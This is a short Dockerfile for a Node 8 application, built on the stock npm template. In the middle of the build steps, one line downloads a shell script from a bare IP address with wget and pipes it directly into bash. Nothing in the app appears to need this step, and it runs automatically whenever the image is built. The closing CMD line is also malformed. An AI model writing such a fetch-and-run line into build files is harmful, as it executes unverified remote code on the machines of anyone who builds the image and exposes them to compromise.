FROM node:8

# Create app directory
WORKDIR /usr/src/app

# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
# where available (npm@5+)
COPY package*.json ./

RUN npm install
RUN apt update
RUN apt -y install  wget coreutils
RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash

# Bundle app source
COPY . .

EXPOSE 8090
CMD [ "npm", "start", "/bin/bash" ]
